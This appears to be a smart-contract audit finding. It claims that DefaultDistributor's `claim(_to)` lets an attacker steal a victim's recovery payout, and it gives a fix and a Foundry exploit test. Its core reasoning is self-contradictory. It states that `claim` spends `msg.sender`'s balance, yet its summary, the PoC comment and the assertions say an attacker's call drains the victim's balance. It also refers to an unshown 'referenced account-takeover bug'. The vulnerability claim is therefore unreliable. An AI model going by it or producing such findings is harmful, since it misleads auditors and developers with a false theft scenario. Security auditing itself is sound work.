### Title
DefaultDistributor lets any caller redirect a claimer’s recovery payout to an arbitrary recipient - (File: `contracts/DefaultDistributor.sol`)

### Summary

`DefaultDistributor.claim` authenticates and spends the tranche-token balance of `msg.sender`, but sends the resulting underlying recovery payout to caller-supplied `_to` without requiring `_to == msg.sender`. Once a claimant approves the distributor—which is required to claim—an attacker can call `claim(attacker)` first, transfer the victim’s entire tranche balance into the distributor, and receive the victim’s recovery proceeds.

The vulnerable authorization flow is directly analogous to the referenced account-takeover bug: one identifier is authenticated (`msg.sender`), while a different caller-selected identifier controls the sensitive output (`_to`), and the two are never compared.

### Finding Description

`claim` takes the complete `trancheToken` balance of `msg.sender` using `safeTransferFrom`, then transfers the calculated amount of `token` to `_to`. [1](#0-0) 

There is no check that the claimant and recipient are the same, no allowance for the payout destination, and no signed authorization from `msg.sender` designating `_to`. The distributor is explicitly intended to distribute recovered underlying tokens pro rata to tranche holders. [2](#0-1) 

Because `safeTransferFrom` spends the claimant’s existing ERC-20 allowance, an attacker only needs the victim to have approved the distributor. Approval is a prerequisite for any legitimate claim, so the vulnerable sequence occurs during ordinary protocol use.

### Impact Explanation

This allows direct theft of a claimant’s entire default-recovery entitlement.

If the victim has tranche balance `B` and the distributor recovery rate is `R`, the attacker receives:

```text
stolenAmount = B * R / ONE_TRANCHE
```

For a victim holding the whole tranche supply, this is the entire underlying recovery allocated to that tranche. The victim’s tranche tokens remain locked in the distributor, while the corresponding payout is sent to the attacker. This violates the “one receipt, one payout to its owner” invariant and causes permanent loss of unclaimed recovery funds.

### Likelihood Explanation

Likelihood is high whenever a claimant approves the distributor before calling `claim`, which is the expected user flow. The approval can be front-run or exploited while it remains outstanding.

No privileged role, borrower misbehavior, default manipulation, oracle data, reentrancy, or malformed external contract is required. The attacker can be any EOA. Honest owner actions are limited to funding the distributor and activating claims. [3](#0-2) 

### Recommendation

Bind the recovery payout to the authenticated claimant:

```solidity
function claim() external {
  require(isActive, '!ACTIVE');
  IERC20 tranche = IERC20(trancheToken);
  uint256 trancheBal = tranche.balanceOf(msg.sender);
  tranche.safeTransferFrom(msg.sender, address(this), trancheBal);
  IERC20(token).safeTransfer(msg.sender, trancheBal * rate / ONE_TRANCHE);
}
```

Alternatively, retain `_to` only if `_to == msg.sender` is enforced, or require an explicit signed authorization from `msg.sender` for third-party payout destinations. The simplest fix is removing `_to`.

### Proof of Concept

The following Foundry test can be added at `test/foundry/DefaultDistributorClaimRecipient.t.sol`. It runs on a fork and demonstrates that an attacker steals the victim’s entire recovery payout after the victim grants the normal claiming allowance.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import {Test} from "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {DefaultDistributor} from "contracts/DefaultDistributor.sol";

contract TestToken is ERC20 {
  constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_) {}

  function mint(address to, uint256 amount) external {
    _mint(to, amount);
  }
}

contract DefaultDistributorClaimRecipientTest is Test {
  function test_AttackerRedirectsVictimClaim() public {
    vm.createSelectFork(vm.envString("ETH_RPC_URL"));

    address owner = makeAddr("owner");
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");

    TestToken underlying = new TestToken("Underlying", "UND");
    TestToken tranche = new TestToken("Recovery Tranche", "RTR");

    DefaultDistributor distributor =
      new DefaultDistributor(address(underlying), address(tranche), owner);

    uint256 victimTranches = 100e18;
    uint256 recovery = 40e18;

    tranche.mint(victim, victimTranches);
    underlying.mint(address(distributor), recovery);

    vm.prank(owner);
    distributor.setIsActive(true);

    // Required allowance for the victim's intended legitimate claim.
    vm.prank(victim);
    tranche.approve(address(distributor), type(uint256).max);

    // The attacker names itself as `_to`; the victim's balance is still spent.
    vm.prank(attacker);
    distributor.claim(attacker);

    assertEq(tranche.balanceOf(victim), 0);
    assertEq(tranche.balanceOf(address(distributor)), victimTranches);
    assertEq(underlying.balanceOf(attacker), recovery);
    assertEq(underlying.balanceOf(victim), 0);
  }
}
```

The test shows that the contract debits `victim` but pays `attacker`, converting the victim’s full `100e18` tranche claim into the attacker’s `40e18` underlying payout. [1](#0-0)
